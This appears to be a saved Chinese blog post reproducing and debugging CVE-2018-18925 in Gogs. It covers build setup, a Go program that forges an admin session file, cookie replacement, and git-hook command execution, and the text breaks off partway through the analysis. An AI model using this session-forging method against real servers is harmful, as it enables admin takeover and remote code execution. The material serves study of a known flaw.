@@ -1,0 +1,518 @@
+
+
+<!DOCTYPE html>
+<html lang="en" color-mode=light>
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>Gogs 远程命令执行漏洞 - rt</title>
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="google" content="notranslate" />
+  
+  <meta name="description" content="1@ 前言ll 说学语言是死劲儿，不好用。我说我这个有...">
+  <meta name="author" content="rt">
+  <link rel="icon" href="/images/icons/favicon-16x16.png" type="image/png" sizes="16x16">
+  <link rel="icon" href="/images/icons/favicon-32x32.png" type="image/png" sizes="32x32">
+  <link rel="apple-touch-icon" href="/images/icons/apple-touch-icon.png" sizes="180x180">
+  <meta rel="mask-icon" href="/images/icons/stun-logo.svg" color="#333333">
+  
+    <meta rel="msapplication-TileImage" content="/images/icons/favicon-144x144.png">
+    <meta rel="msapplication-TileColor" content="#000000">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+
+  
+    
+<link rel="stylesheet" href="https://at.alicdn.com/t/font_1445822_p6ry5n7lrr.css">
+
+  
+
+  
+    
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css">
+
+  
+
+  
+    
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/nord.min.css" name="highlight-style" mode="light">
+
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/nord.min.css" name="highlight-style" mode="dark">
+
+      
+  
+
+  <script>
+    var CONFIG = window.CONFIG || {};
+    var ZHAOO = window.ZHAOO || {};
+    CONFIG = {
+      isHome: false,
+      fancybox: true,
+      pjax: false,
+      loading: {
+        gif: '/images/theme/loading.gif',
+        lottie: ''
+      },
+      lazyload: {
+        enable: true,
+        only_post: 'false',
+        loading: {
+          gif: '/images/theme/loading.gif',
+          lottie: ''
+        }
+      },
+      donate: {
+        enable: false,
+        alipay: 'https://pic.izhaoo.com/alipay.jpg',
+        wechat: 'https://pic.izhaoo.com/wechat.jpg'
+      },
+      galleries: {
+        enable: true
+      },
+      fab: {
+        enable: true,
+        always_show: false
+      },
+      carrier: {
+        enable: true
+      },
+      daovoice: {
+        enable: false
+      },
+      preview: {
+        background: {
+          default: '',
+          api: ''
+        },
+        motto: {
+          default: '',
+          typing: true,
+          api: '',
+          data_contents: '["data","content"]'
+        },
+      },
+      qrcode: {
+        enable: true,
+        type: 'url',
+        image: 'https://i.328888.xyz/2023/04/13/igT1lV.jpeg',
+      },
+      toc: {
+        enable: true
+      },
+      scrollbar: {
+        type: 'default'
+      },
+      notification: {
+        enable: false,
+        delay: 4500,
+        list: '',
+        page_white_list: '',
+        page_black_list: ''
+      },
+      search: {
+        enable: false,
+        path: ''
+      }
+    }
+  </script>
+
+  
+
+  
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="lock-screen">
+  <div class="loading" id="loading"></div>
+  
+    
+
+
+  <nav class="navbar">
+    <div class="left">
+      
+        <i class="iconfont iconhome j-navbar-back-home"></i>
+      
+      
+        <i class="iconfont iconqrcode j-navbar-qrcode"></i>
+      
+      
+        <i class="iconfont iconmoono" id="color-toggle" color-toggle="light"></i>
+      
+      
+    </div>
+    <div class="center">Gogs 远程命令执行漏洞</div>
+    <div class="right">
+      <i class="iconfont iconmenu j-navbar-menu"></i>
+    </div>
+    
+      <div id="qrcode-navbar"></div>
+    
+  </nav>
+
+  
+  
+
+<nav class="menu">
+  <div class="menu-container">
+    <div class="menu-close">
+      <i class="iconfont iconbaseline-close-px"></i>
+    </div>
+    <ul class="menu-content"><li class="menu-item">
+        <a href="/ " class="underline "> 首页</a>
+      </li><li class="menu-item">
+        <a href="/archives/ " class="underline "> 归档</a>
+      </li><li class="menu-item">
+        <a href="/about/ " class="underline "> 关于</a>
+      </li><li class="menu-item">
+        <a href="/articles/ " class="underline "> 文章</a>
+      </li></ul>
+    
+      <div class="menu-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">rt</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+    
+  </div>
+</nav>
+  <main id="main">
+  <div class="article-wrap">
+    <div class="row container">
+      <div class="col-xl-3"></div>
+      <div class="col-xl-6"><article class="article">
+  <div class="wrap">
+    <section class="head">
+  <img   class="lazyload" data-original="/images/theme/post-image.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  draggable="false">
+  <div class="head-mask">
+    <h1 class="head-title">Gogs 远程命令执行漏洞</h1>
+    <div class="head-info">
+      <span class="post-info-item"><i class="iconfont iconcalendar"></i>December 11, 2020</span>
+      
+      <span class="post-info-item"><i class="iconfont iconfont-size"></i>8812</span>
+    </div>
+  </div>
+</section>
+    <section class="main">
+      <section class="content">
+        
+        <h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1@ 前言"></a>1@ 前言</h2><p>ll 说学语言是死劲儿，不好用。我说我这个有用，他说我这个没用，漏洞复现是化劲儿。所以接下来我要开始着手 Go 安全相关的漏洞复现了。第一个选取的复现对象是 Gogs 远程命令执行漏洞，[CVE-2018-18925](<a target="_blank" rel="noopener" href="https://rt95.gitee.io/2020/12/11/CVE-2018-18925">https://rt95.gitee.io/2020/12/11/CVE-2018-18925</a> Gogs 远程命令执行漏洞&#x2F;.<a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2018-18925)%E3%80%82">https://nvd.nist.gov/vuln/detail/CVE-2018-18925)。</a></p>
+<p>首先简单介绍下 Gogs。Gogs（又名Go Git Service），是 Gogs 团队开发的一款基于 Go 语言的自助 Git 托管服务，它支持创建，迁移公开&#x2F;私有仓库，添加，删除仓库协作者，而 Gitea 是 Gogs 的一个分支，所以也随之收到了漏洞影响。</p>
+<h2 id="2-环境搭建"><a href="#2-环境搭建" class="headerlink" title="2@ 环境搭建"></a>2@ 环境搭建</h2><p>由于第一次搭建 Go 相关的服务，在这上面花了一定的时间。所以我会详细的说下环境搭建时碰到的问题和解决办法。</p>
+<blockquote>
+<p>漏洞复现环境:</p>
+<p>os : win10 x64</p>
+<p>go version go1.14 windows&#x2F;amd64</p>
+<p>gogs v0.11.66</p>
+</blockquote>
+<h3 id="2-1-源码下载"><a href="#2-1-源码下载" class="headerlink" title="2.1 源码下载"></a>2.1 源码下载</h3><p>由于需要动态调试，所以需要通过源码编译的方式来下载 gogs。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span>、首先将源码扒下来：<br>git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/gogs/g</span>ogs.git gogs<br><br><span class="hljs-number">2</span>、切换到指定漏洞分支代码，切到自定义分支<br>git checkout -b vul v0.<span class="hljs-number">11.66</span><br></code></pre></td></tr></table></figure>
+
+<p>编译此服务需要 gcc 环境，这里建议使用 <code>tdm-gcc</code> 因为它集成了最新稳定版的 gcc 工具集，防止你编译出错再进行补丁或者更新。<a target="_blank" rel="noopener" href="https://jmeubank.github.io/tdm-gcc/">下载地址传送门</a></p>
+<h3 id="2-2-源码编译"><a href="#2-2-源码编译" class="headerlink" title="2.2 源码编译"></a>2.2 源码编译</h3><p>源码编译肯定是坑最多的时候，在正式编译之前呢，我们需要了解一些 Go 包管理的知识，也好理解后边的问题。</p>
+<h4 id="go-mod-初识"><a href="#go-mod-初识" class="headerlink" title="go mod 初识"></a>go mod 初识</h4><p>go.mod 是 Golang1.11 版本之后新引入的官方包管理工具，用于解决之前没有地方记录依赖包具体版本的问题，方便依赖包的管理。实际上就是一个 Modules，官方定义为:</p>
+<blockquote>
+<p>Modules 是相关 Go 包 的集合，是源代码交换和版本控制的单元。</p>
+<p>Modules 和 传统 GOPATH 不同，不需要包含 src，bin 这样的目录，一个源代码目录甚至是空目录都可以作为 Modules，只要其中包含 go.mod。</p>
+</blockquote>
+<p>那么如何使用 go.mod ? 需要将 golang 的版本升级到 <code>1.11</code> 以上，随后设置 <code>GO111MODULE</code> 配置项:</p>
+<blockquote>
+<p><code>GO111MODULE</code>有三个值：<code>off</code>, <code>on</code>和<code>auto（默认值）</code>。</p>
+<ul>
+<li><code>GO111MODULE=off</code>，go 命令行将不会支持 module 功能，寻找依赖包的方式将会沿用旧版本那种通过vendor 目录或者 GOPATH 模式来查找。<code>go env -w GO111MODULE=off</code></li>
+<li><code>GO111MODULE=on</code>，go 命令行会使用 modules，而一点也不会去 GOPATH 目录下查找。</li>
+<li>GO111MODULE&#x3D;auto<ul>
+<li>默认值，go命令行将会根据当前目录来决定是否启用 module 功能。这种情况下可以分为两种情形：<ul>
+<li>当前目录在 GOPATH&#x2F;src 之外且该目录包含 go.mod 文件</li>
+<li>当前文件在包含 go.mod 文件的目录下面。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</blockquote>
+<p>另外，使用 Go 的包管理方式，依赖的第三方包被下载到了 <code>$GOPATH/pkg/mod</code> 下面。</p>
+<h4 id="编译报错"><a href="#编译报错" class="headerlink" title="编译报错"></a>编译报错</h4><p>按照上面步骤继续编译，首先初始化 go.mod</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span> 这里涉及到国内用户下载慢的问题，设置代理即可，注意是 http proxy，不是 https：<br>set HTTP_PROXY=http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">1080</span><br><br>go init	<span class="hljs-regexp">//</span> 初始化 go.mod 文件<br><br><span class="hljs-regexp">//</span> go mod vendor 【这步可以不执行，详见下面那段话】	<span class="hljs-regexp">//</span> 从 mod 中拷贝到项目的 vendor 目录下面，同步一下依赖版本，这样 IDE 就可以识别了<br></code></pre></td></tr></table></figure>
+
+<p>上面的操作步骤中，牵扯到新旧包管理模式的转换，当 Go 使用 mod 模式的包管理时，如果没有 <code>go.mod</code> 文件, 编译时如果检测到 vendor 目录，执行 <code>go mod init</code>会将 <code>vendor.json</code> 里面的依赖以相关格式复制到新生成的 <code>go.mod</code> 文件当中。这时还并未下载第三方依赖，当真正 build 或者 run 的时候，才会从相关资源处下载第三方依赖。<code>go mod vendor</code> 这一步可以省略，如果你还是想要用 vendor 类的包管理，那么执行这个命令可以通过 <code>go.mod</code> 文件下载依赖并且覆盖到 vendor 目录。</p>
+<p>1、编译报错 1，包名大小写冲突:</p>
+<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">vendor\gopkg.in\macaron.v1\context.<span class="hljs-name">go</span>:<span class="hljs-number">34</span>:<span class="hljs-number">2</span>: case-insensitive <span class="hljs-keyword">import</span> <span class="hljs-name">collision</span>: <span class="hljs-string">&quot;github.com/unknwon/com&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;github.com/Unknwon/com&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>原因是因为 Go 语言导包不区分大小写，但是必须一致，否则不能通过编译，统一将对应代码改为 <code>Unknown</code>，改目录亲测不好使。</p>
+<p>2、编译报错2，依赖包出现问题:</p>
+<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs oxygene"># github.com/gogs/gogs/routes/api/v1/misc<br>routes\api\v1\misc\markdown.go:<span class="hljs-number">26</span>:<span class="hljs-number">13</span>: form.Mode undefined (<span class="hljs-keyword">type</span> gogs.MarkdownOption <span class="hljs-keyword">has</span> no field <span class="hljs-keyword">or</span> <span class="hljs-keyword">method</span> <span class="hljs-title function_">Mode</span>)<br></code></pre></td></tr></table></figure>
+
+<p>这个问题也比较有意思，主要原因就是使用了 <code>go mod</code> 这种新的包管理方式时，会远程下载包，而在最新版的 go-gogs-client 这个项目中，10 个月之前删除了 <code>Mode</code> 字段，而在旧版代码中 vendor 自带目录代码中还是有 <code>Mode</code> 字段的，一旦使用了 <code>go mod</code> 包管理就会覆盖此文件，使用最新的代码，也就是没有了 <code>Mode</code> 字段，需要自己手动添加。代码位置在 : <code>github.com/gogs/go-gogs-client/miscellaneous.go</code>, 添加 <code>Mode</code> 字段，最终代码如下:</p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-comment">// Copyright 2015 The Gogs Authors. All rights reserved.</span><br><span class="hljs-comment">// Use of this source code is governed by a MIT-style</span><br><span class="hljs-comment">// license that can be found in the LICENSE file.</span><br><br>package gogs<br><br><span class="hljs-built_in">type</span> MarkdownOption <span class="hljs-keyword">struct</span> &#123;<br>	Text    <span class="hljs-keyword">string</span><br>	Mode	<span class="hljs-keyword">string</span><br>	Context <span class="hljs-keyword">string</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>但是我编译最新版本的 gogs 时未报此错误，所以我们看下最新版本如何处理包的依赖:</p>
+<p>最新版的 gogs 没有 <code>vendor 目录</code> 直接存在一个生成好的 go.mod 文件 (推测较旧版本的时间段 mod 管理发展的还不是很成熟)，查看 <code>go-gogs-client</code> 包的版本:</p>
+<p><img   class="lazyload" data-original="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/gogs_rce/1.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>可以看到正是在这个版本移除了 <code>Mode</code> 字段，新版本应该也对对应代码进行了修改，具体就不深究了。</p>
+<p>应该还有 <code>govendor</code> 对应的解决办法，在此就不深究了，有需要的同学可以自行探索。</p>
+<blockquote>
+<p>更新 : 2020.12.13</p>
+<p>最近在复现 gitea 相关漏洞时发现，当新旧包管理出现冲突时，可以先使用 go mod init 生成 go.mod 文件，然后使用 <code>go build -mod=vendor -o 文件名.exe</code> 沿用 vendor 目录下的依赖，可以避免新版本代码覆盖旧版本的一些问题。</p>
+</blockquote>
+<h3 id="2-3-web-服务搭建"><a href="#2-3-web-服务搭建" class="headerlink" title="2.3 web 服务搭建"></a>2.3 web 服务搭建</h3><p>编译完成后，使用 <code>gogs.exe web</code> 开启安装 web 页面，访问 <code>127.0.0.1:3000</code> 进入即可。在正式安装之前，我们需要初始化一下数据库。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql -u root -p &lt; scripts/mysql.sql<br></code></pre></td></tr></table></figure>
+
+<p>然后需要建立一个 mysql 数据库用户 gogs , 将刚刚创建的数据库的权限全部赋予给它:</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">&gt; create user <span class="hljs-string">&#x27;gogs&#x27;</span>@<span class="hljs-string">&#x27;localhost&#x27;</span> identified by <span class="hljs-string">&#x27;密码&#x27;</span>;<br>&gt; grant all privileges on gogs.* to <span class="hljs-string">&#x27;gogs&#x27;</span>@<span class="hljs-string">&#x27;localhost&#x27;</span>;<br>&gt; flush privileges;<br>&gt; <span class="hljs-keyword">exit</span>;<br></code></pre></td></tr></table></figure>
+<p><img   class="lazyload" data-original="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/gogs_rce/2.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>搭建完成，开始漏洞复现。</p>
+<h2 id="3-使用-Goland-进行调试"><a href="#3-使用-Goland-进行调试" class="headerlink" title="3@ 使用 Goland 进行调试"></a>3@ 使用 Goland 进行调试</h2><blockquote>
+<p>调试之前需要注意，需要将 git 放到环境变量</p>
+</blockquote>
+<p>将项目导入到 Goland 之后，新建一个 Go Build 项目：</p>
+<p><img   class="lazyload" data-original="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/gogs_rce/3.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>跑起来之后在对应服务对应的代码上下断点，即可开始调试了：</p>
+<p><img   class="lazyload" data-original="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/gogs_rce/4.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<h2 id="4-漏洞分析"><a href="#4-漏洞分析" class="headerlink" title="4@ 漏洞分析"></a>4@ 漏洞分析</h2><h3 id="4-1-漏洞成因"><a href="#4-1-漏洞成因" class="headerlink" title="4.1 漏洞成因"></a>4.1 漏洞成因</h3><p>Gogs 使用 go-macaron 作为 Web 框架，而 go-macaron 中的 session 插件并没有对 sessionid 进行安全检查，导致攻击者可以使用任意文件作为 session，登录其他任意账号。此漏洞存在于 gogs &lt;&#x3D; 0.11.66，以及 gitea &lt;&#x3D; 1.5.3 的版本当中。第一个注册的用户 id 为 1，默认为管理员。我们可以使用此漏洞越权到管理员，结合服务自带的 githooks 直接 getshell。</p>
+<h3 id="4-2-漏洞复现"><a href="#4-2-漏洞复现" class="headerlink" title="4.2 漏洞复现"></a>4.2 漏洞复现</h3><p>下面我们进行漏洞复现。为了方便演示，我们除了管理员用户之外再新建一个用户 <code>test</code>。</p>
+<p><img   class="lazyload" data-original="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/gogs_rce/5.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>用此普通用户，并创建任意一个 repo :</p>
+<p><img   class="lazyload" data-original="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/gogs_rce/6.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>我们使用 Go 特有的序列化方式，我们可以编写一段 Go 语言程序，来生成一段 Gob 编码的 session （来自 p 牛）</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;bytes&quot;</span><br>    <span class="hljs-string">&quot;encoding/gob&quot;</span><br>    <span class="hljs-string">&quot;encoding/hex&quot;</span><br>    <span class="hljs-string">&quot;fmt&quot;</span><br>    <span class="hljs-string">&quot;io/ioutil&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">EncodeGob</span><span class="hljs-params">(obj <span class="hljs-keyword">map</span>[<span class="hljs-keyword">interface</span>&#123;&#125;]<span class="hljs-keyword">interface</span>&#123;&#125;)</span></span> ([]<span class="hljs-type">byte</span>, <span class="hljs-type">error</span>) &#123;<br>    <span class="hljs-keyword">for</span> _, v := <span class="hljs-keyword">range</span> obj &#123;<br>        gob.Register(v)<br>    &#125;<br>    buf := bytes.NewBuffer(<span class="hljs-literal">nil</span>)<br>    err := gob.NewEncoder(buf).Encode(obj)<br>    <span class="hljs-keyword">return</span> buf.Bytes(), err<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-keyword">var</span> uid <span class="hljs-type">int64</span> = <span class="hljs-number">1</span><br>    obj := <span class="hljs-keyword">map</span>[<span class="hljs-keyword">interface</span>&#123;&#125;]<span class="hljs-keyword">interface</span>&#123;&#125;&#123;<span class="hljs-string">&quot;_old_uid&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;uid&quot;</span>: uid, <span class="hljs-string">&quot;uname&quot;</span>: <span class="hljs-string">&quot;rt&quot;</span>&#125;<br>    data, err := EncodeGob(obj)<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>        fmt.Println(err)<br>    &#125;<br>    err = ioutil.WriteFile(<span class="hljs-string">&quot;data1&quot;</span>, data, <span class="hljs-number">0644</span>)<span class="hljs-string">`//`</span>创建了 data 文件， 文件权限 <span class="hljs-number">644</span><br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>        fmt.Println(err)<br>    &#125;<br>    edata := hex.EncodeToString(data)<br>    fmt.Println(edata)<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>将生成的此文件发布后，会将该文件存储在 <code>data/attachments/文件名[0]/文件名[1]/文件名</code> 路径下，我们直接在浏览器插件上把 <code>i_like_gogits</code>cookie 项换成上面格式的值，然后刷新页面，成功升级为管理员用户。</p>
+<p><img   class="lazyload" data-original="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/gogs_rce/7.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>然后伪造管理员账户，创建仓库，在仓库设置 &#x3D;&gt; 管理 git 钩子 &#x3D;&gt; post-recieve 中编辑命令，新建文件后会触发此钩子的命令。</p>
+<p><img   class="lazyload" data-original="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/gogs_rce/8.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<h3 id="4-3-漏洞调试"><a href="#4-3-漏洞调试" class="headerlink" title="4.3 漏洞调试"></a>4.3 漏洞调试</h3><p>由于 Go 在 v1.13 版本之后就默认开启了 <code>go mod</code> 包管理模式，所以，代码中牵扯到的一些第三方包的引入需要注意其真实位置是在 <code>GOPATH/pkg/mod</code> 目录下。</p>
+<p>本次调试过程观察周期从 <code>gogs</code> 系统初始化阶段到最后的漏洞触发点。</p>
+<p>首先，从 <code>gogs</code> 的主文件 <code>gogs.go</code> 看起，主要是初始化一些系统变量，最后运行 <code>app.Run()</code> 方法，进入之后的代码逻辑。</p>
+<p><img   class="lazyload" data-original="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/gogs_rce/9.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>跟进 <code>Run</code> 方法，首先执行这个 app 实例的 <code>Setup()</code> 方法，主要目的是为了确保所有的数据结构初始化以准备好参与之后代码的运行，这里提几个需要注意的点:</p>
+<p>1、代码中创建了一个目录(categories),用来映射命令名字 <code>name</code> 和本身数据结构作为一个快速查询的目录，方便后面用名字查找对应的命令。</p>
+<p>2、在 Go 语言中，对自定义数据结构进行排序，需要对此数据结构实现 <code>sort.Interface</code> 的三个方法:</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-constructor">Len()</span>	<span class="hljs-comment">// 获取数据集合元素个数；</span><br><span class="hljs-constructor">Less(<span class="hljs-params">i</span>,<span class="hljs-params">j</span> <span class="hljs-params">int</span>)</span> <span class="hljs-comment">// 如果如果 i 索引的数据小于 j 索引的数据，返回 true，且不会调用下面的 Swap()，即数据升序排序。</span><br><span class="hljs-constructor">Swap(<span class="hljs-params">i</span>, <span class="hljs-params">j</span> <span class="hljs-params">int</span>)</span> <span class="hljs-comment">// 交换 i 和 j 索引的两个元素的位置</span><br></code></pre></td></tr></table></figure>
+
+<p>sort 这个标准库内部实现了四种基本排序算法，插入排序，归并排序，堆排序和快速排序，只要你对待排序的结构实现了上面接口的方法，那么 sort 包就会根据实际数据自动高效选择排序算法，这个过程对编程者是透明的。</p>
+<p><img   class="lazyload" data-original="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/gogs_rce/10.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>跳出继续跟进 <code>Run()</code> 方法，之后就是一些解析 flag (命令行参数)的操作，结合 Go 内置的 flag 库进行操作，然后使用 <code>cli</code> 包下的函数 <code>NewContext()</code> 进行运行期上下文的创建，当执行 app 或者一些命令的时候，需要使用到运行期的一些数据。</p>
+<p><img   class="lazyload" data-original="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/gogs_rce/11.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>继续跟进到 <code>app.go</code> 文件的第 252 行，开始进行运行上下文参数的获取以及命令的执行。</p>
+<p><img   class="lazyload" data-original="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/gogs_rce/12.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>继续跟进到 259行的 <code>Run()</code> 方法里，将刚刚初始化过的 app 上下文参数，传递到具体的 <code>Command</code> 执行过程中。最后调用具体 <code>Command</code> 的具体 <code>Action</code>，也就是每个 <code>Command</code> 的 go 文件对应的具体函数。调试过程中可以发现，在 web 服务里面，执行的是 <code>runWeb()</code> 函数。</p>
+<p><img   class="lazyload" data-original="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/gogs_rce/13.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>继续跟进到 <code>runWeb</code> 方法内，由于 <code>gogs</code> 这个系统使用的是 <code>go-macaron</code> 的开源 web 框架，所以相关路由风格也是这个组件的实现风格。通过 <code>context.Toggle()</code> 这个函数，结合不同的传入参数配置，返回不同的鉴权函数，用以绑定到不同的访问路由上面。在创建新的 <code>macaron</code> 对象时，使用了 <code>Use()</code> 这个中间件机制。什么是 中间件机制？</p>
+<blockquote>
+<p>中间件处理器是工作与请求和路由之间的。本质上来说和 Macaron 其他的处理器没有分别。中间件处理器可以非常好处理一些功能，包括日志记录、授权认证、会话（sessions）处理、错误反馈等其他任何需要在发生在 HTTP 请求之前或者之后的操作。 —— 来自 macaron 官方文档</p>
+</blockquote>
+<p>所以说一些鉴权的工作可以放在路由对应处理器正式生效之前。这里是放在了 newMacaron 里面。因为不同的中间件之间还有依赖关系，官方给出了比较好的载入顺序:</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">macaron.<span class="hljs-constructor">Logger()</span><br>macaron.<span class="hljs-constructor">Recovery()</span><br>gzip.<span class="hljs-constructor">Gziper()</span><br>macaron.<span class="hljs-constructor">Static()</span><br>macaron.<span class="hljs-constructor">Renderer()</span>/pongo2.<span class="hljs-constructor">Pongoer()</span><br>i18n.<span class="hljs-constructor">I18n()</span><br>cache.<span class="hljs-constructor">Cacher()</span><br>captcha.<span class="hljs-constructor">Captchaer()</span><br>session.<span 